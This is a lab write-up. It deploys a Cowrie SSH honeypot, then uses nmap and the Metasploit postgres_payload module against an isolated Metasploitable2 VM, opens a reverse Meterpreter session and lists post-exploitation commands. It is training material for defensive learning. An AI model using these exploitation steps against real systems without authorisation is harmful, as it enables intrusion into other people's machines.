# Honeypot Deployment & Metasploitable2 Exploitation Lab

Date: 2026-02-08  
Attacker Machine: Kali Linux (192.168.43.205)  
Honeypot Machine: Cowrie Honeypot Server (192.168.43.202)  
Target Machine: Metasploitable2 (192.168.43.25)  
Environment: VirtualBox isolated lab network

---

## PART 1 — Cowrie SSH Honeypot Deployment

### Objective
Deploy a Cowrie honeypot to simulate a vulnerable SSH server, detect and log attacker interactions, and observe how attackers behave once they gain access.

### What is Cowrie?
Cowrie is a medium-to-high interaction SSH honeypot designed to log brute force attacks and shell interaction performed by attackers. It simulates a real Linux system to deceive and monitor malicious actors.

### Installation Steps

cowrie install via pip
cd etc
nano cowrie.cfg
cowrie start

### Verification

cowrie status — returned: cowrie is running (PID: 2848)
ip a — Honeypot IP: 192.168.43.202
ping -c4 192.168.43.202 — 0% packet loss

### Nmap Scan of Honeypot

nmap -sS -sV -O 192.168.43.202

Port 22 — OpenSSH 9.6p1 Ubuntu
Port 2222 — OpenSSH 9.2p1 Debian

### Attacker Interaction

ssh root@192.168.43.202 -p 2222
whoami — root
ls, cd — session timed out with auto-logout

### Observations
- Cowrie logged all commands silently
- Attacker had no idea it was a fake system
- Hostname inside honeypot appeared as svr04

---

## PART 2 — Metasploitable2 PostgreSQL Exploitation

### Objective
Perform reconnaissance and exploit a known PostgreSQL vulnerability to gain remote code execution using Metasploit.

### Nmap Scan

nmap -sS -sV -O 192.168.43.25

Open ports found:
- 21 vsftpd 2.3.4
- 22 OpenSSH 4.7p1
- 80 Apache 2.2.8
- 445 Samba 3.x-4.x
- 5432 PostgreSQL 8.3.0
- 3306 MySQL 5.0.51a
- 5900 VNC 3.3

OS: Linux 2.6.9 — metasploitable.localdomain

### Exploitation

use exploit/linux/postgres/postgres_payload
set rhosts 192.168.43.25
set lhost 192.168.43.205
set lport 5432
exploit

Meterpreter session opened successfully

### Post Exploitation

getuid — postgres
sysinfo — Ubuntu 8.04, Linux 2.6.24-16-server
shell
whoami — postgres
id — uid=108(postgres)
pwd — /var/lib/postgresql/8.3/main

---

## Lessons Learned

1. Honeypots silently log all attacker activity
2. Outdated PostgreSQL 8.3 had public exploits available
3. Default credentials allowed exploitation without brute force
4. Nmap reconnaissance revealed full attack surface
5. Always patch and update services in production environments

---

## Tools Used
- Cowrie Honeypot v2.9.10
- Nmap 7.98
- Metasploit Framework
- OpenSSH client
